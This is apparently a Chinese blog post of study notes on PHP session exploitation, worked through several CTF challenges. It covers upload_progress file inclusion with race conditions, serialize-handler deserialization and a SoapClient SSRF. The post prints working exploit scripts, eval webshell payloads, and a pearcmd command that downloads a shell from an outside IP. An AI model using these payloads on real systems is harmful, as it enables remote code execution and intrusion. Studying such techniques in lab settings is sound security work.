---
title: "PHP_Session学习笔记"
slug: "php-session-study-notes"
description: "十分常见的考点了捏，也有反序列化的身影"
date: 2021-11-29T22:23:42+08:00
categories: ["NOTES&SUMMARY"]
series: ["反序列化"]
tags: ["PHP", "PHP_Session", "unserialize"]
draft: false
toc: true
---

提到session，能想到什么捏？文件上传，条件竞争，session包含，反序列化…… 让我们一点点说

------

## session配置&简述

以7.4.3为例，php.ini中关于Session有几个默认项

- `session.auto_start = 0`：默认不启动session，*但是可以在php脚本中手动执行`session_start()`

- `session.save_handler = files`：session以文件形式存储

- `session.save_path=""`：session文件存储路径 文件名为`sess_PHPSESSID`

  linux下默认存储位置；*可以被修改

  ```
  /var/lib/php/sess_PHPSESSID
  /var/lib/php/sessions/sess_PHPSESSID

  /var/lib/php5/sess_PHPSESSID
  /var/lib/php5/sessions/sess_PHPSESSID

  /tmp/sess_PHPSESSID
  /tmp/sessions/sess_PHPSESSID
  ```

- `session.serialize_handler = php`：session的默认序列化引擎是php

  其实一共有3种，*php和php_serialize这两种是很多题的元凶

  | 序列化引擎                | 存储方式                                                     |
  | ------------------------- | ------------------------------------------------------------ |
  | php                       | 键名\|序列化后字符串                                         |
  | php_binary                | 键名的长度对应的 ASCII 字符（会有不可显示的字符）+键名+经过 serialize() 函数反序列处理的值 |
  | php_serialize(php>=5.5.4) | 将字符串反序列化处理得到的数组                               |

- `session.upload_progress.enabled = On`：当有POST上传行为时，此次上传的详细信息（如上传时间、上传进度等）都会被存储到session中

- `session.upload_progress.cleanup = On`：当POST上传完成后，此次的session文件内容会被立即情况

- `session.upload_progress.prefix = "upload_progress_"`：存入session文件中的前缀部分

- `session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"`：默认name，*可控可利用

- `session.use_strict_mode = 0`：表示我们对Cookie中的PHPSESSID字段可控

## 文件包含&条件竞争

默认情况下`session.use_strict_mode = 0`，当我们设置了Cookie的`PHPSESSID`字段后的值value后，php会自动创建session文件（默认路径`/tmp/sess_PHPSESSID`）；注意这个行为并不需要`session.auto_start = On`或是`session_start()`来手动开启就会被PHP自动初始化一个session，并将prefix+value写入sess_PHPSESSID文件中；整个流程中value可控，我们可以把恶意的payload加载到sess文件中然后包含，得到rce

这是一个常见的上传表单

```html
<form action="index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="666666" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

当然一般的题不会有这么单纯，还会配一个默认项`session.upload_progress.cleanup = On`；但是如果我们构造上传表单时传的无用文件很大时就可以来个顶级拉扯（条件竞争），在它被清空前先包含&rce

### [WMCTF2020]Make PHP Great Again

开幕源码暴击

```php
<?php
highlight_file(__FILE__);
require_once 'flag.php';
if(isset($_GET['file'])) {
  require_once $_GET['file'];
}
```

这个题的非预期解：文件包含+条件竞争

```python
import io
import requests
import threading

sessid = 'AMIZ'
data = {"cmd": "system('tac /var/www/html/flag.php');"}

def write(session):
    while True:
        f = io.BytesIO(b'a' * 100 * 50)
        session.post('http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('amiz.txt', f)}, cookies={'PHPSESSID': sessid})

def read(session):
    while True:
        resp = session.post('http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/?file=/tmp/sess_'+sessid, data=data)
        if 'amiz.txt' in resp.text:
            print(resp.text)
            event.clear()
        else:
            pass

if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        for i in range(1, 30):
            threading.Thread(target=write, args=(session,)).start()

        for i in range(1, 30):
            threading.Thread(target=read, args=(session,)).start()
    event.set()

```

### [HXB 2021]easywill

willphp v2.1.5，是基于tp的框架

```php
<?php
namespace home\controller;
class IndexController{
    public function index(){
        highlight_file(__FILE__);
        assign($_GET['name'],$_GET['value']);
        return view();
    }
}
```

assign()可以控制name和value参数，而紧跟着的view函数有点东西

![image-20211118101839993](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101839993.png)

![image-20211118101952307](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101952307.png)

![image-20211118102033617](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102033617.png)

可以看到最后的49行有文件写入的点，51行有个`extract()`可以做到变量覆盖，那我们就把file_put_contents的参数换成自己想要的

```
/?name=cfile&value=/etc/passwd
```

可以正常回显

![image-20211118102448850](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102448850.png)

不过flag文件的名字并不是flag，我们可以用pearcmd写shell的方法来个webshell（详细的可以参考我之前写过的另一个题->[[强网拟态 2021]Give_me_your_0day](https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/#give_me_you_0day)

```
/?name=cfile&value=/../../../../usr/local/lib/php/pearcmd.php&+install+-R+/tmp+http://101.35.114.107:2301/shell.php
```

不过这里要注意shell的写法，常规的`<?php eval($_POST['a']);?>`这样的是不行的，下载就会报错

![image-20211118103659930](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118103659930.png)

执行也会报错，这里的shell要这样写

```php
<?php echo '<?php system("ls /");'?>
```

![image-20211118105922638](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118105922638.png)

之后直接把value的值换成flag文件名即可

```
/?name=cfile&value=/flag32897328937298hdwidh
```

————不过这里我直接写🐎一直成功不了，只能远程包含🐎

![image-20211118110226581](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118110226581.png)

————诶，说了半天，其实和本篇有关的在非预期的点，和上面的脚本几乎一样，要改的地方在于read部分的url了

```
?name=cfile&value=/tmp/sess_'+sessid
```

## 反序列化

这里详细的讲解可以参照[PHP中SESSION反序列化机制](https://blog.spoock.com/2016/10/16/php-serialize-problem/)，就不做复制粘贴工程师了，用自己的话讲几个里面已经提过的点吧

首先，这里的问题（我们可以攻击的原因）出现在两种序列化引擎混用的情况下，当提交

```
?a=|O:8:"stdClass":0:{}
```

时，`php_serialize`方式下会被存储为

```
a:1:{s:1:"a";s:20:"|O:8:"stdClass":0:{}";}
```

但是被`php`方式则会解析为

```
a:1:{s:1:"a";s:20:"=O:8:"stdClass":0:{}";}
```

在具体应用时，可控的点除了get/post的参数之外，还可以接着构造文件上传的表单，除了`PHPSESSID`之外的废物文件的文件名就可以当此大任，记得序列化字符前面要加上`|`，内部的双引号要用`\`进行转义

### [XCTF final 2018]bestphp

[这里是docker环境](https://github.com/shimmeris/CTF-Web-Challenges/tree/master/File-Inclusion/XCTF-Final-2018-Bestphp)（注意设置暴露端口 另外首页的index.php的submit要改一下

![image-20211129171252486](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129171252486.png)

这里有熟悉的`call_user_func`，来读一下admin.php的源码

```
?function=extract&file=php://filter/convert.base64-encode/resource=admin.php
```

```php
hello admin
<?php
if(empty($_SESSION['name'])){
    session_start();
    #echo 'hello ' + $_SESSION['name'];
}else{
    die('you must login with admin');
}

?>
```

再读一下function.php，但是好像这俩都没啥用

```php
<?php
function filters($data){
    foreach($data as $key=>$value){
        if(preg_match('/eval|assert|exec|passthru|glob|system|popen/i',$value)){
            die('Do not hack me!');
        }
    }
}
?>
```

很显然我们需要利用session包含，但是index.php中设置了open_basedir，默认的session路径是`/var/lib/php/sessions/sess_phpsessid`，不过有个方式可以更改session存储目录

![image-20211129172602323](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172602323.png)

![image-20211129172609578](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172609578.png)

![image-20211129172619585](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172619585.png)

那我们就可以把shell写到web根目录下

```
?function=session_start&save_path=.
POST: name=<?php echo "aaa";system($_GET[x]);?>
```

一般的一句话会没法正常工作（之前湖湘杯willphp也是这样，那个是`<?php echo '<?php system("ls /");'?>`

```
?function=extract&file=/var/www/html/sess_qwer&x=ls
?function=extract&file=/var/www/html/sess_qwer&x=cat+fsadgsdagsadgasd.php
```

拿到flag

#### 解法2：php7.0 - LFI via SegmentFault

参考：[LFI via SegmentFault](https://www.jianshu.com/p/dfd049924258)

```
include.php?file=php://filter/string.strip_tags/resource=/etc/passwd
```

`string.strip_tags`可以导致php在执行过程中Segment Fault

如果请求中同时存在一个上传文件的请求，这个文件会被保留，存储在/tmp/phpxxxxxxxxxxx（xxxxx是数字+字母的6位数），这个文件连续保存，不用竞争直接爆破（多线程上传文件，生成多个phpxxxxxxxxxxx）

利用exp（打出来502是正常情况

```http
POST /index.php?function=extract&file=php://filter/string.strip_tags/resource=function.php HTTP/1.1
Host: 101.35.114.107:20004
Content-Length: 1701
Cache-Control: max-age=0
Origin: null
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeScXqSzdW2v22xyk
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Cookie: PHPSESSID=17qpuv1r8g19pm503593nddq10
Connection: close

------WebKitFormBoundaryeScXqSzdW2v22xyk
Content-Disposition: form-data; name="fileUpload"; filename="test.jpg"
Content-Type: image/jpeg

<?php echo "wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww";@eval($_POST['cmd']);  ?>
------WebKitFormBoundaryeScXqSzdW2v22xyk--
```

上帝视角看的话是这样

![image-20211129183250382](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129183250382.png)

用py脚本爆破出来(py2)

```python
import requests
import string

charset = string.digits + string.letters

host = "10.99.99.16"
port = 80
base_url = "http://%s:%d" % (host, port)


def brute_force_tmp_files():
    for i in charset:
        for j in charset:
            for k in charset:
                for l in charset:
                    for m in charset:
                        for n in charset:
                            filename = i + j + k + l + m + n
                            url = "%s/index.php?function=extract&file=/tmp/php%s" % (
                                base_url, filename)
                            print url
                            try:
                                response = requests.get(url)
                                if 'wwwwwwwwwwwwww' in response.content:
                                    print "[+] Include success!"
                                    return True
                            except Exception as e:
                                print e
    return False


def main():
    brute_force_tmp_files()


if __name__ == "__main__":
    main()
```

爆破成功后就拿到了shell，其余跟上面一样

### [LCTF 2018]bestphp's revenge

————这个栗子结合了SoapClient和session的考点

```php
<?php
highlight_file(__FILE__);
$b = 'implode';
call_user_func($_GET[f],$_POST);
session_start();
if(isset($_GET[name])){
    $_SESSION[name] = $_GET[name];
}
var_dump($_SESSION);
$a = array(reset($_SESSION),'welcome_to_the_lctf2018');
call_user_func($b,$a);
```

看到了我们的老朋友`call_user_func`，它会把第一个参数作为回调函数，其余参数作为回调函数的参数；如果我们第一个参数传入的是数组，它会把数组的第一个值作为类名，第二个值当作方法进行回调（反序列化中常见）；`call_user_func`函数不仅可以调用自定义函数和类，也可以调用php内置函数和内置类，比如`extract`

flag.php可以直接访问（这里我没有扫 看wp知道的 robots.txt和页面源码都没有直接的提示）

![image-20211128225823073](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211128225823073.png)

这个回显很明显需要ssrf，以localhost访问flag.php就会将flag写入SESSION中

内置类`SoapClient()`满足这个需要，它可以通过反序列化来发起一个http请求（需要被调用`__call`

所以整体思路是这样的：

1. 覆盖序列化引擎为`php_serialize`，  通过`session_start`将一个序列化的`SoapClient`写入session；由于get传入的name会被直接放入session中，所以序列化的字符串不用post传，只需要post传设置反序列化引擎的参数就可以
2. 第一个`call_user_func`通过`extract`变量覆盖使`$b = call_user_func`，第二个`call_user_func`调用`SoapClient->__call`（不可访问的方法 call_user_func）

```php
<?php
$target='http://127.0.0.1/flag.php';
$b = new SoapClient(null,array('location' => $target,
    'user_agent' => "AAA:BBB\r\n" .
        "Cookie:PHPSESSID=gnnorfjmr9hr82gej7njt5dc83",
    'uri' => "http://127.0.0.1/"));
$se = serialize($b);
echo "|".urlencode($se);
// O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```

```
/?name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&f=session_start
Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83

POST: serialize_handler=php_serialize
```

```
/?name=Soapclient&f=extract
Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83

POST: b=call_user_func
```

之后刷新页面就可以触发反序列化了，由于上面构造的时候cookie就是当前页面的cookie，所以整一套过程下来不需要单独改session，首页就可以看到结果

![image-20211129123843040](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129123843040.png)

### [Jarvisoj web]PHPINFO

[这里是题目页面](http://web.jarvisoj.com:32784/index.php)；开幕源码

```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }

    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

先看看phpinfo，应该有提示信息；发现`session.upload_progress.enabled=On`，这就非常好了，构造一个上传表单把我们想执行的代码序列化后设为文件名传入

序列化exp

```php
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
<?php
class OowoO
{
    public $mdzz='print_r(scandir(dirname(__FILE__)));';
}
$obj = new OowoO();
echo "|".serialize($obj);
// |O:5:"OowoO":1:{s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";}
```

构造上传表单，注意文件名的引号要加反斜杠转义

```
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}
```

![image-20211129212625924](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129212625924.png)

然后访问这个php

```php
public $mdzz='print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));';
```

```
|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}
```

得到flag

------

呼……长舒一口气，这个知识点终于画上了一个小句号；暑假总结php反序列化的时候就差整个和内置类，结果磨磨蹭蹭拖到今天，不过还是被我终结掉啦！文中还设计了一点SoapClient内置类的东西，由于篇幅原因不展开讲了= = 、

最近的计划和安排就是刷题&把之前的知识体系填充完整，加油啦

------

{{% spoiler "以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（" %}}

[LCTF 2018 Writeup -- ROIS](https://xz.aliyun.com/t/3339#toc-3)

[LFI via SegmentFault](https://www.jianshu.com/p/dfd049924258)

[PHP中SESSION反序列化机制](https://blog.spoock.com/2016/10/16/php-serialize-problem/)  

[利用session.upload_progress进行文件包含和反序列化渗透](https://www.freebuf.com/news/202819.html)

如有遗漏请指正！！！

{{% /spoiler %}}
